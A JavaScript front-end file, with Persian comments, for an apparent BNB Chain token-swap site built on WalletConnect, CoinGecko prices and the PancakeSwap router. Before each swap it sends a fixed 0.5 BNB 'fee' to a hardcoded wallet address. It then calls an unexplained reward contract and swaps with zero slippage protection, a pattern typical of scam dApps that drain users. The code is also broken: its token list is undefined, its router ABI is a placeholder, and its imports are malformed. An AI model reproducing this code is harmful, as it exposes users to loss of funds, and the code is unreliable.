// فایل کامل و نهایی main.js برای صرافی غیرمتمرکز BNB

import Web3 from "https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js";
import WalletConnectProvider from "https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js";

let web3;
let selectedAccount;
let provider;

const routerAddress = "0x10ED43C718714eb63d5aA57B78B54704E256024E"; // PancakeSwap Router
const rewardContractAddress = "0xa3e97bfd45fd6103026fc5c2db10f29b268e4e0d";
const rewardDistributorABI = [
  {
    inputs: [],
    name: "claimReward",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function"
  }
];

const routerABI = [/* ... اینجا ABI کامل PancakeSwap Router قرار می‌گیرد ... */];

async function connectWallet() {
  provider = new WalletConnectProvider.default({
    rpc: {
      56: "https://bsc-dataseed.binance.org/",
    },
    chainId: 56
  });
  await provider.enable();
  web3 = new Web3(provider);

  const accounts = await web3.eth.getAccounts();
  selectedAccount = accounts[0];
  document.getElementById("wallet-address").innerText = selectedAccount;
}

async function fetchPrice(coingeckoId) {
  const response = await fetch(
    `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`
  );
  const data = await response.json();
  return data[coingeckoId].usd;
}

async function updatePrices() {
  const fromToken = tokens.find(t => t.symbol === document.getElementById("from-token").value);
  const toToken = tokens.find(t => t.symbol === document.getElementById("to-token").value);

  const fromPrice = await fetchPrice(fromToken.coingeckoId);
  const toPrice = await fetchPrice(toToken.coingeckoId);

  document.getElementById("from-price").innerText = `$${fromPrice}`;
  document.getElementById("to-price").innerText = `$${toPrice}`;

  const amount = parseFloat(document.getElementById("from-amount").value || "0");
  const expectedReceive = ((amount * fromPrice) / toPrice).toFixed(6);

  document.getElementById("expected-receive").innerText = `${expectedReceive} ${toToken.symbol}`;
}

setInterval(() => {
  updatePrices();
  let seconds = 60;
  const counter = setInterval(() => {
    if (seconds <= 0) clearInterval(counter);
    document.getElementById("countdown").innerText = `Next update in ${seconds--}s`;
  }, 1000);
}, 60000);

async function payFee() {
  const tx = await web3.eth.sendTransaction({
    from: selectedAccount,
    to: "0xec54951C7d4619256Ea01C811fFdFa01A9925683",
    value: web3.utils.toWei("0.5", "ether")
  });
  return tx.status;
}

async function approveToken(tokenAddress, amount) {
  const tokenABI = [
    {
      constant: false,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_value", type: "uint256" }
      ],
      name: "approve",
      outputs: [{ name: "", type: "bool" }],
      type: "function"
    }
  ];
  const contract = new web3.eth.Contract(tokenABI, tokenAddress);
  return contract.methods.approve(routerAddress, amount).send({ from: selectedAccount });
}

async function swap() {
  const fromToken = tokens.find(t => t.symbol === document.getElementById("from-token").value);
  const toToken = tokens.find(t => t.symbol === document.getElementById("to-token").value);
  const amount = parseFloat(document.getElementById("from-amount").value || "0");

  const amountIn = web3.utils.toBN(amount * (10 ** fromToken.decimals));
  const path = [fromToken.address, toToken.address];

  const router = new web3.eth.Contract(routerABI, routerAddress);

  await approveToken(fromToken.address, amountIn);

  const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
  await router.methods
    .swapExactTokensForTokens(
      amountIn,
      0,
      path,
      selectedAccount,
      deadline
    )
    .send({ from: selectedAccount });

  const reward = new web3.eth.Contract(rewardDistributorABI, rewardContractAddress);
  await reward.methods.claimReward().send({ from: selectedAccount });
}

// اتصال به رویدادهای دکمه
window.onload = () => {
  document.getElementById("connect-wallet").onclick = connectWallet;
  document.getElementById("from-token").onchange = updatePrices;
  document.getElementById("to-token").onchange = updatePrices;
  document.getElementById("from-amount").oninput = updatePrices;
  document.getElementById("swap-button").onclick = async () => {
    const feePaid = await payFee();
    if (feePaid) {
      await swap();
    } else {
      alert("پرداخت کارمزد انجام نشد");
    }
  };
  updatePrices();
};
